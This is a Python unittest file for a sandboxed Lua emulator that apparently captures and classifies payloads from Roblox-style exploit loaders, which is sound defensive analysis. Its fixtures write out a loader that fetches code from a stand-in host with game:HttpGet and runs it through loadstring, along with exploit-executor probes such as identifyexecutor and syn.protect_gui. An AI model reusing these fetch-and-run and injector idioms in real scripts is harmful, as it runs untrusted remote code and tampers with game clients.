from __future__ import annotations

import unittest

from core.emulator import LuaEmulator, classify_chunk, emulator_available

try:
    from lupa import lua51  # noqa: F401

    HAVE_LUA = True
except Exception:  # noqa: BLE001
    HAVE_LUA = False

PAYLOAD_URL = "https://cdn.example/payload.lua"
NESTED_SOURCE = 'print("nested layer")'


def bridge(url: object, method: object = "GET") -> str:
    return NESTED_SOURCE if str(url) == PAYLOAD_URL else ""


class ChunkClassificationTests(unittest.TestCase):
    def test_recognises_source_and_binary(self) -> None:
        self.assertEqual(classify_chunk("print(1)"), "lua-source")
        self.assertEqual(classify_chunk("\x1bLuaQ\x00\x01\x04\x08"), "lua51-bytecode")
        self.assertEqual(classify_chunk(""), "empty")


@unittest.skipIf(not HAVE_LUA, "lupa Lua 5.1 is unavailable")
class EmulatorTests(unittest.TestCase):
    def test_captures_loadstring_payloads(self) -> None:
        loader = f"""
        local body = game:HttpGet("{PAYLOAD_URL}")
        local chunk = loadstring(body)
        if chunk then chunk() end
        print("done")
        """
        result = LuaEmulator(profile="universal", http_bridge=bridge).run(loader)
        self.assertEqual(result.status, "completed", result.error)
        kinds = [capture.kind for capture in result.captures]
        self.assertIn("loadstring", kinds)
        captured = [capture for capture in result.captures if capture.kind == "loadstring"]
        self.assertEqual(captured[0].text, NESTED_SOURCE)
        self.assertIn(PAYLOAD_URL, result.fetches)

    def test_injector_probes_do_not_abort_the_run(self) -> None:
        loader = """
        local executor = identifyexecutor()
        local environment = getgenv()
        environment.loaded = true
        if syn and syn.protect_gui then syn.protect_gui({}) end
        if isfunction(writefile) then writefile("cache/test", "1") end
        print(executor, type(game:GetService("Players")))
        """
        result = LuaEmulator(profile="universal").run(loader)
        self.assertEqual(result.status, "completed", result.error)
        prints = [capture.text for capture in result.captures if capture.kind == "print"]
        self.assertTrue(any("Synapse X" in text for text in prints))

    def test_instruction_budget_stops_runaway_loops(self) -> None:
        result = LuaEmulator(profile="universal", max_instructions=1).run("while true do end")
        self.assertEqual(result.status, "limit")
        self.assertIsNotNone(result.error)

    def test_filesystem_and_process_globals_are_absent(self) -> None:
        loader = """
        assert(io == nil, "io should be removed")
        assert(os == nil or os.execute == nil, "os.execute should be removed")
        assert(dofile == nil, "dofile should be removed")
        assert(loadfile == nil, "loadfile should be removed")
        assert(package == nil, "package should be removed")
        print("sandbox ok")
        """
        result = LuaEmulator(profile="universal").run(loader)
        self.assertEqual(result.status, "completed", result.error)

    def test_binary_payloads_are_flagged(self) -> None:
        loader = """
        local bytes = {27, 76, 117, 97, 81, 0, 1, 4, 8}
        local buffer = {}
        for index = 1, #bytes do buffer[index] = string.char(bytes[index]) end
        loadstring(table.concat(buffer))
        """
        result = LuaEmulator(profile="universal").run(loader)
        captured = [capture for capture in result.captures if capture.kind == "loadstring"]
        self.assertTrue(captured)
        self.assertTrue(captured[0].binary)
        self.assertTrue(captured[0].text.startswith("\x1b"))

    def test_unavailable_runtime_is_reported_not_raised(self) -> None:
        result = LuaEmulator(profile="universal").run("print(1)")
        self.assertIn(result.status, {"completed", "unavailable"})
        if result.status == "unavailable":
            self.assertTrue(result.error)


class AvailabilityTests(unittest.TestCase):
    def test_availability_helper_matches_import(self) -> None:
        self.assertEqual(emulator_available(), HAVE_LUA)


if __name__ == "__main__":
    unittest.main()
